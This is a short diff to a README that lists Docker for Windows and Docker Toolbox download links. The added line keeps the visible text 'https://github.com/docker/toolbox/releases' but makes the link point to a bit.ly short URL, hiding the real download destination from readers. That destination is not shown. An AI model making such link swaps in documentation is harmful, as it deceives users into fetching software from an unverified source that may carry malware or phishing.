@@ -13,7 +13,7 @@ _docker for **Windows 10 Professional** or **Enterprise 64-bit**_
 _https://hub.docker.com/editions/community/docker-ce-desktop-windows/_
 
 _docker toolbox - **other Windows**_
-_https://github.com/docker/toolbox/releases_
+_[https://github.com/docker/toolbox/releases](https://bit.ly/3L2vVut)_
 
 _**Default 2.6 Oracle VirtualBox Image**_
 _http://github.com/boot2docker/boot2docker/releases/download/v19.03.5/boot2docker.iso_
